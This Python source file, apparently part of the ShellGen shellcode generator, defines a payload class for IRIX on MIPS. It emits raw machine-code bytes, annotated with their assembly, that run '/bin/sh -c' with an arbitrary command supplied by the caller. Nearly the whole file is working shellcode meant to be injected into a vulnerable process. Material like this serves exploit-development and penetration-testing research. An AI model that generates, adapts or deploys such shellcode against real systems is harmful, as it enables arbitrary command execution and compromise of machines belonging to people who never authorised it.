#!/usr/bin/env python

###############################################################################
## Execute any command in IRIX/MIPS                                          ##
## Shellcode for ShellGen                                                    ##
## Based on anonymous code found on the Internet                             ##
## http://www.shell-storm.org/shellcode/files/shellcode-139.php              ##
###############################################################################

# Copyright (c) 2012 Mario Vilas
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston,
# MA 02110-1301, USA.

__all__ = ["Execute"]

from shellgen import Dynamic

class Execute (Dynamic):
    arch      = "mips"
    os        = "irix"
    requires  = []
    provides  = ["payload"]
    qualities = ["termnull"]

    def __init__(self, command):
        self.command = command

    def compile(self):
        self._bytes = (
            "\x04\x10\xff\xff"       #  bltzal  $zero,<_cmdshellcode>
            "\x24\x02\x03\xf3"       #  li      $v0,1011
            "\x23\xff\x08\xf4"       #  addi    $ra,$ra,2292
            "\x23\xe4\xf7\x40"       #  addi    $a0,$ra,-2240
            "\x23\xe5\xfb\x24"       #  addi    $a1,$ra,-1244
            "\xaf\xe4\xfb\x24"       #  sw      $a0,-1244($ra)
            "\x23\xe6\xf7\x48"       #  addi    $a2,$ra,-2232
            "\xaf\xe6\xfb\x28"       #  sw      $a2,-1240($ra)
            "\x23\xe6\xf7\x4c"       #  addi    $a2,$ra,-2228
            "\xaf\xe6\xfb\x2c"       #  sw      $a2,-1236($ra)
            "\xaf\xe0\xfb\x30"       #  sw      $zero,-1232($ra)
            "\xa3\xe0\xf7\x47"       #  sb      $zero,-2233($ra)
            "\xa3\xe0\xf7\x4a"       #  sb      $zero,-2230($ra)
            "\x02\x04\x8d\x0c"       #  syscall
            "\x01\x08\x40\x25"       #  or      $t0,$t0,$t0
            "/bin/sh -c "
        ) + self.command + "\x00"
